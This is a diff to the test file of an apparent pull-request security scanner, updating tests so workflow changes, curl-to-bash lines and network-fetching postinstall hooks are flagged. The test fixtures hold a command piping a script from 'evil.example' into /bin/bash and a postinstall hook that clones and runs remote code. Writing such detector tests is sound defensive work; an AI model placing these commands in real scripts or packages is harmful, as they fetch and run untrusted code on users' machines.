@@ -24,7 +24,10 @@ describe('scanPullSecurity', () => {
       ]),
     ).toEqual({
       ok: false,
-      reasons: ['.github/workflows/ci.yml: adds pull_request_target'],
+      reasons: [
+        '.github/workflows/ci.yml: changes a workflow',
+        '.github/workflows/ci.yml: adds pull_request_target',
+      ],
     })
   })
 
@@ -69,7 +72,7 @@ describe('scanPullSecurity', () => {
     })
   })
 
-  it('ignores pull_request_target on a deleted line', () => {
+  it('alerts when a workflow file changes, even if the patch only deletes', () => {
     expect(
       scanPullSecurity([
         {
@@ -77,6 +80,41 @@ describe('scanPullSecurity', () => {
           patch: '@@ -1,2 +1,1 @@\n-  pull_request_target:\n on:\n',
         },
       ]),
-    ).toEqual({ ok: true, reasons: [] })
+    ).toEqual({
+      ok: false,
+      reasons: ['.github/workflows/ci.yml: changes a workflow'],
+    })
+  })
+
+  it('alerts on curl piped to /bin/bash', () => {
+    expect(
+      scanPullSecurity([
+        {
+          path: 'scripts/setup.sh',
+          patch:
+            '@@ -1 +1,2 @@\n #!/bin/sh\n+curl https://evil.example/x.sh | /bin/bash\n',
+        },
+      ]),
+    ).toEqual({
+      ok: false,
+      reasons: ['scripts/setup.sh: shell download or reverse shell'],
+    })
+  })
+
+  it('alerts on a package.json postinstall that clones then runs', () => {
+    expect(
+      scanPullSecurity([
+        {
+          path: 'packages/ai/package.json',
+          patch:
+            '@@ -1,3 +1,4 @@\n {\n+  "postinstall": "git clone ssh://git@host/repo /tmp/p && /tmp/p/install"\n }\n',
+        },
+      ]),
+    ).toEqual({
+      ok: false,
+      reasons: [
+        'packages/ai/package.json: "postinstall": "git clone ssh://git@host/repo /tmp/p && /tmp/p/install" fetches the network',
+      ],
+    })
   })
 })
